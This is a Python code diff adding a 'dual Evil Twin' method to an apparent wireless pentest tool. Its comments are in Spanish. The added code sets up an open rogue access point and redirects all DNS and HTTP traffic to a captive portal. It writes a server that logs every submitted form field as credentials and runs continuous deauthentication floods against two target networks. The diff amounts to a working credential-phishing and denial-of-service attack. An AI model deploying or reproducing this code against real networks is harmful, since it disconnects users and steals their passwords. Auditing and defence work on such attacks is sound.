@@ -24,6 +24,7 @@ class EvilTwinService:
         self._stop_event = threading.Event()
         self._worker_thread = None
         self.active_session_dir = None
+        self.multi_deauth = None
 
     @staticmethod
     def list_portals():
@@ -232,6 +233,203 @@ if __name__ == "__main__":
         self._worker_thread.start()
         return self._worker_thread
 
+    def start_evil_twin_dual(self, ap_iface: str, mon1: str, mon2: str,
+                             red_ap: dict, target1: dict, target2: dict, portal_name: str,
+                             on_output=None, on_cred=None):
+        """
+        Inicia Evil Twin con Rouge AP en ap_iface y desautenticación dual en mon1 y mon2.
+        """
+        from dragonfly.services.wifi_service import MultiDeauthAttack
+        self._stop_event.clear()
+        self.is_running = True
+
+        def runner():
+            session_dir = SessionManager.create_session(BASE_DIR_EVIL)
+            self.active_session_dir = session_dir
+            timestamp = os.path.basename(session_dir).replace("Auditoria-", "")
+
+            if on_output:
+                on_output(f"[*] Iniciando Evil Twin Dual (AP: {red_ap.get('essid', 'Desconocido')})")
+                on_output(f"[*] Sesión guardada en: {session_dir}")
+
+            self._limpiar_procesos_previos()
+
+            # 1. Preparar directorio web temporal
+            tmp_web = f"/tmp/evil_twin_web_{timestamp}"
+            os.makedirs(tmp_web, exist_ok=True)
+            portal_source = os.path.join(DIR_EVIL_PORTALS, portal_name)
+            try:
+                shutil.copytree(portal_source, tmp_web, dirs_exist_ok=True)
+            except Exception as e:
+                if on_output:
+                    on_output(f"[!] Aviso al copiar portal: {e}")
+
+            cred_log = os.path.join(session_dir, "credentials.log")
+
+            # 2. Servidor HTTP de captura
+            capture_script = f'''#!/usr/bin/env python3
+import http.server, urllib.parse, os
+from datetime import datetime
+
+LOG = "{cred_log}"
+
+class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        parsed_path = urllib.parse.urlparse(self.path)
+        if parsed_path.query:
+            try:
+                params = urllib.parse.parse_qs(parsed_path.query)
+                with open(LOG, "a") as f:
+                    f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} DATA_GET:{{params}}\\n")
+                    f.flush(); os.fsync(f.fileno())
+            except Exception: pass
+
+        if parsed_path.path == "/":
+            self.path = "/index.html"
+
+        local_path = self.translate_path(self.path)
+        if not os.path.isfile(local_path):
+            if self.path == "/index.html":
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write(b"<html><body><h2>Error: index.html no existe.</h2></body></html>")
+                return
+            self.send_response(302)
+            self.send_header("Location", "http://10.0.0.1/index.html")
+            self.end_headers()
+            return
+        return super().do_GET()
+
+    def do_POST(self):
+        try:
+            length = int(self.headers.get("Content-Length", 0))
+            data = self.rfile.read(length).decode("utf-8", "ignore")
+            params = urllib.parse.parse_qs(data)
+            with open(LOG, "a") as f:
+                f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} CREDENCIALES:{{params}}\\n")
+                f.flush(); os.fsync(f.fileno())
+        except Exception: pass
+
+        self.send_response(302)
+        self.send_header("Location", "http://10.0.0.1/success.html")
+        self.end_headers()
+
+    def log_message(self, format, *args): pass
+
+if __name__ == "__main__":
+    os.chdir("{tmp_web}")
+    class ThreadedServer(http.server.ThreadingHTTPServer):
+        allow_reuse_address = True
+    with ThreadedServer(("0.0.0.0", 80), CaptivePortalHandler) as httpd:
+        httpd.serve_forever()
+'''
+            with open(f"{tmp_web}/capture.py", "w") as f:
+                f.write(capture_script)
+
+            if not os.path.exists(f"{tmp_web}/success.html"):
+                with open(f"{tmp_web}/success.html", "w") as f:
+                    f.write('<html><body style="background:#0b1a2a;color:#fff;text-align:center;font-family:sans-serif;margin-top:20vh;"><h2>Conexión Restablecida</h2><p>Ya puede cerrar esta ventana.</p></body></html>')
+
+            # 3. Hostapd
+            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            hostapd_conf = f"interface={ap_iface}\ndriver=nl80211\nssid={red_ap['essid']}\nhw_mode=g\nchannel={int(red_ap['ch'])}\nmacaddr_acl=0\nauth_algs=1\nwpa=0\nignore_broadcast_ssid=0\n"
+            with open("/tmp/hostapd_evil.conf", "w") as f:
+                f.write(hostapd_conf)
+
+            proc_hostapd = subprocess.Popen(["sudo", "hostapd", "/tmp/hostapd_evil.conf"],
+                                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.pm.register("hostapd", proc_hostapd)
+            time.sleep(3)
+
+            # 4. Configurar IP
+            subprocess.run(["sudo", "nmcli", "device", "set", ap_iface, "managed", "no"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "down"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
+            time.sleep(1.5)
+
+            # 5. Dnsmasq
+            dnsmasq_conf = f"interface={ap_iface}\nexcept-interface=lo\nbind-interfaces\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\nno-hosts\nno-resolv\n"
+            with open("/tmp/dnsmasq_evil.conf", "w") as f:
+                f.write(dnsmasq_conf)
+
+            subprocess.run(["sudo", "pkill", "dnsmasq"], stderr=subprocess.DEVNULL)
+            proc_dnsmasq = subprocess.Popen(["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
+                                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.pm.register("dnsmasq", proc_dnsmasq)
+            time.sleep(2)
+
+            # 6. Reglas Iptables
+            subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
+            for port in ["80", "53"]:
+                subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
+            for port in ["53", "67"]:
+                subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
+
+            # 7. Servidor Web
+            proc_web = subprocess.Popen(["sudo", "python3", f"{tmp_web}/capture.py"],
+                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.pm.register("web_server", proc_web)
+            time.sleep(1)
+
+            # 8. Deauth Dual con MultiDeauthAttack
+            subprocess.run(["sudo", "iw", "dev", mon1, "set", "channel", str(target1['ch'])], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+            subprocess.run(["sudo", "iw", "dev", mon2, "set", "channel", str(target2['ch'])], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+
+            self.multi_deauth = MultiDeauthAttack(
+                mon_ifaces=[mon1, mon2],
+                bssids=[target1['bssid'], target2['bssid']],
+                channels=[str(target1['ch']), str(target2['ch'])],
+                burst=0,
+                callback=on_output
+            )
+            self.multi_deauth.start()
+
+            if on_output:
+                on_output("[+] Rogue AP y Servidor Cautivo activos con Deauth Dual.")
+                on_output("[*] Escuchando credenciales entrantes...")
+
+            # 9. Bucle de escucha
+            last_lines = 0
+            while not self._stop_event.is_set():
+                time.sleep(2)
+                if os.path.exists(cred_log):
+                    with open(cred_log, "r") as f:
+                        lines = f.readlines()
+                        if len(lines) > last_lines:
+                            for line in lines[last_lines:]:
+                                cleaned = line.strip()
+                                if on_output:
+                                    on_output(f"[+] Credencial: {cleaned}")
+                                if on_cred:
+                                    on_cred(cleaned)
+                            last_lines = len(lines)
+
+            # 10. Limpieza final
+            self.pm.terminate_all()
+            if self.multi_deauth:
+                self.multi_deauth.stop()
+                self.multi_deauth = None
+            ProcessManager.flush_iptables(ap_iface)
+            for m in [mon1, mon2]:
+                if m:
+                    subprocess.run(["sudo", "airmon-ng", "stop", m], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            ProcessManager.restart_network_manager()
+
+            if on_output:
+                on_output("[+] Evil Twin Dual detenido y red restaurada con éxito.")
+
+            self.is_running = False
+
+        self._worker_thread = threading.Thread(target=runner, daemon=True)
+        self._worker_thread.start()
+        return self._worker_thread
+
     def _limpiar_procesos_previos(self):
         """Mata procesos huérfanos de ataques anteriores."""
         self.pm.terminate_all()
@@ -243,6 +441,12 @@ if __name__ == "__main__":
     def stop_evil_twin(self):
         """Envía la señal de parada al ataque Evil Twin."""
         self._stop_event.set()
+        if self.multi_deauth:
+            try:
+                self.multi_deauth.stop()
+            except Exception:
+                pass
+            self.multi_deauth = None
         self.is_running = False
 
     def list_saved_sessions(self):
